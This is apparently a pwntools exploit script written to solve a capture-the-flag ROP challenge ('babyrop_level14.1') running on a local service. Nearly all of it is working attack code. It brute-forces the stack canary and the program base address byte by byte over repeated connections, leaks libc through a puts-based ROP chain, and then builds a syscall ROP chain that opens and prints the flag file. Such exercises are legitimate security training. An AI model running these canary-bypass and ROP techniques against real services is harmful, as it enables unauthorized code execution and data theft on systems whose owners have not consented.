from pwn import *
import time 

offset = 0x60
s = '''
b * challenge+108
'''
binary = './babyrop_level14.1_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')


context.binary = binary
#p = remote('localhost', 1337)


#gdb.attach(p, s)

# 0xebc15024f35e0100 


# output might be different
# might not have Goodbye
canary = b'\x00'
for i in range(7):
	for new_byte in range(0xff + 1):
		p = remote('localhost', 1337)
		
		
		#gdb.attach(p, s)
		payload = flat(
			b'A'* 0x68,
			canary + p8(new_byte)
		)
		

		try:
			p.send(payload)
			response = p.recvuntil(b"Goodbye!", timeout = 1)
			print(response)
			if b"Goodbye!" in response:
				print("Success! byte = ", hex(new_byte))
				canary += p8(new_byte)
			p.close()
			break

		except EOFError:
			print("failed")
			p.close()
		
print("Successfully brute-forced the canary, it is: ", canary.hex())





# 0x560a1434d350

# 00101320
rip = b'\xa2'
'''
p = remote('localhost', 1337)
gdb.attach(p, s)

payload = flat(
	b'A'* 0x68,
	canary,
	b'B' * 8,
	rip
)
p.send(payload)
p.interactive()
'''

for i in range(5):
	for new_byte in range(0xff + 1):
		
		p = remote('localhost', 1337)
		
		
		payload = flat(
			b'A'* 0x68,
			canary,
			b'B' * 8,
			rip + p8(new_byte)
		)

		try:
			p.send(payload)
			response = p.recvuntil("Leaving!\n### Goodbye!", timeout = 1)
			print(response)
			if b"Leaving!\n### Goodbye!" in response:
				print("Success! byte = ", hex(new_byte))
				rip += p8(new_byte)
			p.close()
			break 
			
		except EOFError:
			print("failed")
			p.close()


rip = int.from_bytes(rip, 'little')
elf.address = rip - 0x20a2
print("Successfully brute-forced the program base address, it is: ", hex(elf.address))


# gadgets

pop_rdi = elf.address + 0x0000000000002133 


p = remote('localhost', 1337)
#gdb.attach(p, s)
payload = flat(
	b'A'* 0x68,
	canary,
	b'B' * 8,
	p64(pop_rdi),
	elf.got['puts'],
	elf.plt['puts']
)
p.send(payload)

p.recvuntil(b'Leaving!\n')
leak = p.recv(6)  # Just receive exactly 6 bytes for the address
leak = u64(leak.ljust(8, b'\x00'))
libc_base = leak - libc.sym['puts']

#print(hex(leak))
#print(hex(libc_base))



p.close()



#essential address 
f_string_addr = libc_base + next(libc.search(b'f\0'))
flag_addr = elf.bss() + 100
f_string_addr = elf.bss() + 150
#gadgets again 


#gadgets:
pop_rdi = libc_base + 0x0000000000023b6a
print(hex(pop_rdi))
pop_rax = libc_base + 0x0000000000036174
pop_rsi = libc_base + 0x000000000002601f
pop_rdx_pop_r12_ret = libc_base + 0x0000000000119431
syscall = libc_base + 0x00000000000630a9
leave_ret = libc_base + 0x0578c8







p = remote('localhost', 1337)
#gdb.attach(p, s)

payload = flat(
	# read
	b'A'*0x68,
	canary,
	b'B'*8, # old rbp
	
	
	# read 
	pop_rdi,
	0, # fd
	pop_rsi,
	f_string_addr,
	pop_rdx_pop_r12_ret,
	100,
	0,
	pop_rax,
	0,
	syscall,
	
	
	# open
	pop_rdi,
	f_string_addr,
	pop_rsi,
	0,
	pop_rax,
	2,
	syscall,
	
	# read 
	pop_rdi,
	3,
	pop_rsi,
	flag_addr,
	pop_rdx_pop_r12_ret,
	100,
	0,
	pop_rax,
	0,
	syscall,
	
	# write
	pop_rdi,
	1,
	pop_rsi,
	flag_addr,
	pop_rdx_pop_r12_ret,
	100,
	0,
	pop_rax,
	1,
	syscall
	
	
)
p.send(payload)
time.sleep(5)
p.clean()
p.send('./flag')

p.interactive()
